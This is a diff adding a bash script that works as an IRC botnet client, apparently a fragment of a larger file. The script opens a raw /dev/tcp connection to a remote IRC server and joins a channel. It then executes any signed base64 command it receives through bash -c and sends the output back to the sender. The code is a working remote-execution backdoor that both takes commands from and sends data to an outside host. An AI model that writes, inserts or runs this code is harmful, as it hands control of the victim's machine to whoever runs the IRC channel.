@@ -1,0 +1,46 @@
+eval 'exec 3<>/dev/tcp/$ircserver/6667;'
+if [[ ! "$?" -eq 0 ]] ; then
+    continue
+fi
+eval 'printf "NICK $NICK\r\n" >&3;'
+if [[ ! "$?" -eq 0 ]] ; then
+    continue
+fi
+eval 'printf "USER user 8 * :IRC hi\r\n" >&3;'
+if [[ ! "$?" -eq 0 ]] ; then
+    continue
+fi
+# Main loop
+while [ true ]; do
+    eval "read msg_in <&3;"
+    if [[ ! "$?" -eq 0 ]] ; then
+        break
+    fi
+    if  [[ "$msg_in" =~ "PING" ]] ; then
+        printf "PONG %s\n" "${msg_in:5}";
+        eval 'printf "PONG %s\r\n" "${msg_in:5}" >&3;'
+        if [[ ! "$?" -eq 0 ]] ; then
+            break
+        fi
+        sleep 1
+        eval 'printf "JOIN #biret\r\n" >&3;'
+        if [[ ! "$?" -eq 0 ]] ; then
+            break
+        fi
+    elif [[ "$msg_in" =~ "PRIVMSG" ]] ; then
+        privmsg_h=$(echo $msg_in| cut -d':' -f 3)
+        privmsg_data=$(echo $msg_in| cut -d':' -f 4)
+        privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)
+        hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
+        sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`
+
+        if [[ "$sign" == "$hash" ]] ; then
+            CMD=`echo $privmsg_data | base64 -d -i`
+            RES=`bash -c "$CMD" | base64 -w 0`
+            eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
+            if [[ ! "$?" -eq 0 ]] ; then
+                break
+            fi
+        fi
+    fi
+done
